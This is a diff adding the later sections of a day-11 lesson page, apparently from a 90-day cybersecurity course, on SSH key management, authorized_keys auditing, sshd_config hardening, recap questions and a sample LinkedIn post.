+  </div>
+
+  <!-- 7. TASKS -->
+  <div class="sec">
+    <div class="sh" onclick="tog('tasks')">
+      <div class="sl"><div class="si" style="background:var(--color-background-warning)"><i class="ti ti-checklist" style="color:var(--color-text-warning)" aria-hidden="true"></i></div><div><div class="st">7. Daily Tasks & Challenges</div><div class="ss">Complete before moving to Day 12</div></div></div>
+      <i class="ti ti-chevron-down chev" id="chev-tasks" aria-hidden="true"></i>
+    </div>
+    <div class="sb" id="body-tasks">
+      <div class="task-item"><div class="tnum">1</div><div class="ttxt">Generate a new Ed25519 key pair with a strong passphrase. Verify permissions: <code>700</code> on <code>~/.ssh/</code>, <code>600</code> on the private key, <code>644</code> on the public key. Write from memory what each file contains, why permissions matter, and what the passphrase protects against. Save to <code>~/security-lab/notes/day11-ssh.txt</code>.</div></div>
+      <div class="task-item"><div class="tnum">2</div><div class="ttxt">Run the complete authorized_keys audit loop from the Blue Team section on your system. For every key found, record: which user it belongs to, when the file was last modified (<code>stat</code>), and what comment the key has (if any). Any key you cannot explain the origin of is a finding — document it as if writing a security report finding.</div></div>
+      <div class="task-item"><div class="tnum">3</div><div class="ttxt">Audit your local <code>/etc/ssh/sshd_config</code> against the hardening checklist using <code>sudo sshd -T</code>. For each misconfigured setting, write: what the current value is, what it should be, and what specific attack it enables in its current state. Do NOT apply changes unless you have an alternative way into the machine — confirm you have console/recovery access first.</div></div>
+      <div class="task-item"><div class="tnum">4</div><div class="ttxt">Complete OverTheWire Bandit Levels 13–17. Each level requires SSH key auth, pivoting through intermediate hosts, or port forwarding. These are some of the most real-world applicable Bandit levels. After completing them, write one paragraph explaining what technique each level taught.</div></div>
+      <div class="task-item"><div class="tnum">5</div><div class="ttxt">Add the full "SSH AUDIT" section from the Blue Team area to your <code>recon.sh</code> script. Include: active sshd settings check, all authorized_keys enumeration, recent successful and failed SSH logins from auth.log, and a flag if PasswordAuthentication is enabled. Your script now covers system identity, processes, persistence, users, SUID, network, and SSH — that is a production-grade recon tool.</div></div>
+    </div>
+  </div>
+
+  <!-- 8. BOOK -->
+  <div class="sec">
+    <div class="sh" onclick="tog('book')">
+      <div class="sl"><div class="si" style="background:var(--color-background-info)"><i class="ti ti-books" style="color:var(--color-text-info)" aria-hidden="true"></i></div><div><div class="st">8. Book of the Day</div><div class="ss">One highly recommended resource</div></div></div>
+      <i class="ti ti-chevron-down chev" id="chev-book" aria-hidden="true"></i>
+    </div>
+    <div class="sb" id="body-book">
+      <div style="display:flex;gap:12px;background:var(--color-background-secondary);border-radius:var(--border-radius-md);padding:.75rem 1rem;border:0.5px solid var(--color-border-tertiary);margin-top:.5rem">
+        <div style="width:40px;height:54px;border-radius:4px;display:flex;align-items:center;justify-content:center;flex-shrink:0;background:var(--color-background-danger)"><i class="ti ti-book" style="font-size:20px;color:var(--color-text-danger)" aria-hidden="true"></i></div>
+        <div>
+          <div style="font-size:13px;font-weight:500;color:var(--color-text-primary);margin-bottom:3px">The Hacker Playbook 2 — Peter Kim (Chapter 3: SSH)</div>
+          <div style="font-size:12px;color:var(--color-text-secondary);line-height:1.5">One of the most practical offensive security books written. Chapter 3 covers SSH from an attacker's perspective — key theft, pivoting, tunnelling, and persistence via authorized_keys injection — exactly today's Red Team content. Reading this immediately after today's defensive material gives you the attacker-defender duality that makes security professionals effective. Each chapter is written as a real engagement walk-through, not theory. Pairing today's defensive hardening with the attacker's playbook view cements both perspectives permanently.</div>
+        </div>
+      </div>
+      <div style="margin-top:.75rem">
+        <span class="tag tr">Attacker perspective</span><span class="tag tb">Chapter 3 tonight</span><span class="tag tg">Direct match for today</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- 9. CONTENT -->
+  <div class="sec">
+    <div class="sh" onclick="tog('content')">
+      <div class="sl"><div class="si" style="background:var(--color-background-info)"><i class="ti ti-brand-linkedin" style="color:var(--color-text-info)" aria-hidden="true"></i></div><div><div class="st">9. Content Creation Guide</div><div class="ss">What to post · Platform · Hashtags</div></div></div>
+      <i class="ti ti-chevron-down chev" id="chev-content" aria-hidden="true"></i>
+    </div>
+    <div class="sb" id="body-content">
+      <div class="g2">
+        <div class="mc"><div class="lbl">Best platform</div><div class="val">LinkedIn — the "stolen key pivots through 6 servers" story resonates strongly with security hiring teams</div></div>
+        <div class="mc"><div class="lbl">Secondary</div><div class="val">Twitter/X — SSH hardening checklist as an image, or "known_hosts is your network map" insight</div></div>
+        <div class="mc"><div class="lbl">Visual idea</div><div class="val">Screenshot of your authorized_keys audit loop output — shows real applied security thinking</div></div>
+        <div class="mc"><div class="lbl">Strong hook</div><div class="val">"Your ~/.ssh/known_hosts is a complete map of every server you've ever connected to"</div></div>
+      </div>
+      <h3 style="margin-top:1rem">Sample LinkedIn post</h3>
+      <div class="post-box">Day 11 of my cybersecurity journey — SSH + Remote Access Security
+
+Something most developers don't realise:
+
+Your ~/.ssh/known_hosts file is a complete list of every server you've ever connected to.
+
+And your ~/.ssh/config reveals the usernames, ports, and hostnames of your most-used connections.
+
+If an attacker compromises your laptop and finds an SSH private key with no passphrase, they don't just get your machine. They get every server that key authorises — silently, with no password prompt, in seconds.
+
+Today I learned exactly how to defend against this:
+
+→ Always set a passphrase on SSH private keys
+→ Use Ed25519 keys (faster and more secure than RSA)
+→ Never reuse one key across multiple servers
+→ Set PermitRootLogin no and PasswordAuthentication no in sshd_config
+→ Audit authorized_keys on every server you manage quarterly
+
+The one-liner I run on every system I investigate:
+
+find /home /root -name "authorized_keys" 2>/dev/null
+
+If you don't recognise every key in there — that's your next investigation.
+
+Added a full SSH audit section to recon.sh today.
+
+Day 11 of 90. 🛡️
+
+#SSH #Linux #Cybersecurity #BlueTeam #InfoSec #LearnInPublic #100DaysOfCyber #SecurityEngineering #IncidentResponse</div>
+    </div>
+  </div>
+
+  <!-- 10. TIPS -->
+  <div class="sec">
+    <div class="sh" onclick="tog('tips')">
+      <div class="sl"><div class="si" style="background:var(--color-background-warning)"><i class="ti ti-bulb" style="color:var(--color-text-warning)" aria-hidden="true"></i></div><div><div class="st">10. Pro Tips & Mindset</div><div class="ss">SSH habits that separate beginners from professionals</div></div></div>
+      <i class="ti ti-chevron-down chev" id="chev-tips" aria-hidden="true"></i>
+    </div>
+    <div class="sb" id="body-tips">
+      <div class="tip-item"><i class="ti ti-star" style="color:var(--color-text-warning)" aria-hidden="true"></i><p>Use an SSH agent. Running <code>eval $(ssh-agent) && ssh-add ~/.ssh/id_ed25519</code> loads your passphrase-protected key into memory — you type the passphrase once per session, not on every connection. This removes the last excuse for not using a passphrase. On macOS and most desktop Linux distros the agent starts automatically.</p></div>
+      <div class="tip-item"><i class="ti ti-star" style="color:var(--color-text-warning)" aria-hidden="true"></i><p>Maintain <code>~/.ssh/config</code> rigorously. It saves typing, enforces correct key selection, documents your access inventory, and makes ProxyJump through bastion hosts trivially easy. A well-managed config file is genuinely one of the most practical productivity improvements in daily security work.</p></div>
+      <div class="tip-item"><i class="ti ti-star" style="color:var(--color-text-warning)" aria-hidden="true"></i><p>Before applying <code>PasswordAuthentication no</code> to a production server, open a second SSH session in a separate terminal and verify key-based auth works in that session before closing the first. The number of engineers who have locked themselves out of production servers doing this wrong is enormous. Test in a live second session, then apply.</p></div>
+      <div class="tip-item"><i class="ti ti-alert-triangle" style="color:var(--color-text-danger)" aria-hidden="true"></i><p>Never commit an SSH private key to a git repository. Not even a "test" key. Git history is permanent and public repos are indexed by automated scanners within minutes of a push. If you accidentally commit one, assume it is already compromised — rotate it immediately, then remove it from git history using BFG Repo Cleaner or <code>git filter-repo</code>.</p></div>
+      <div class="tip-item"><i class="ti ti-alert-triangle" style="color:var(--color-text-danger)" aria-hidden="true"></i><p>Changing SSH port from 22 reduces bot traffic but is not a security control. A port scan finds the new port in seconds. Never rely on a non-default port as a primary security measure — it is noise reduction at best. Real security is key-based auth, fail2ban, and AllowUsers restrictions.</p></div>
+      <div class="tip-item"><i class="ti ti-shield" style="color:var(--color-text-success)" aria-hidden="true"></i><p>Pro mindset: treat SSH keys exactly like physical keys to a building. You wouldn't make one master key that opens every door and leave a copy lying around. Each server gets a unique key. Each key has a passphrase. The authorized_keys file on each server is reviewed quarterly. This operational discipline is what protects real infrastructure — and it's the same discipline you apply starting today.</p></div>
+    </div>
+  </div>
+
+  <!-- 11. RECAP -->
+  <div class="sec">
+    <div class="sh" onclick="tog('recap')">
+      <div class="sl"><div class="si" style="background:var(--color-background-secondary)"><i class="ti ti-moon" style="color:var(--color-text-secondary)" aria-hidden="true"></i></div><div><div class="st">11. Quick Recap</div><div class="ss">5 questions before you sleep</div></div></div>
+      <i class="ti ti-chevron-down chev" id="chev-recap" aria-hidden="true"></i>
+    </div>
+    <div class="sb" id="body-recap">
+      <p>Answer all 5 from memory. These are standard questions in security engineer, DevOps, and pentesting interviews.</p>
+      <div class="task-item"><div class="tnum">✓</div><div class="ttxt">How does SSH key-based auth work? Walk through the challenge-response: what does the server send, what does the client do with it, and what does the server verify — without the private key ever being transmitted?</div></div>
+      <div class="task-item"><div class="tnum">✓</div><div class="ttxt">What is the difference between local forwarding (<code>-L</code>) and remote forwarding (<code>-R</code>)? Give one security use case for each — one defensive, one from a pentesting perspective.</div></div>
+      <div class="task-item"><div class="tnum">✓</div><div class="ttxt">Name 5 <code>sshd_config</code> settings that should be hardened from their defaults on any production server. For each one, explain what attack the default value enables.</div></div>
+      <div class="task-item"><div class="tnum">✓</div><div class="ttxt">What does <code>~/.ssh/known_hosts</code> contain? Why does SSH warn when a host key changes unexpectedly, and what specific attack does this warning help detect?</div></div>
+      <div class="task-item"><div class="tnum">✓</div><div class="ttxt">Why must an SSH private key always have a passphrase? What does the passphrase protect against that key permissions (600) alone do not?</div></div>
+      <div class="div"></div>
+      <p>5/5 means Day 11 is complete. Tomorrow is <strong>Day 12: Package Management + Security Tools</strong> — how Linux software is installed and updated, how packages can be a supply chain attack vector, and the essential security tools every analyst needs.</p>
+      <div style="margin-top:.75rem"><span class="tag tb">Day 12 →</span><span class="tag tg">Package Management · apt · Security tool installation</span></div>
+    </div>
+  </div>
+</div>
+
+<script>
+function tog(id){
+  const b=document.getElementById('body-'+id);
+  const c=document.getElementById('chev-'+id);
+  if(!b)return;
+  const isOpen=b.classList.contains('open');
+  b.classList.toggle('open',!isOpen);
+  if(c)c.classList.toggle('open',!isOpen);
+}
+tog('theory');
+</script>
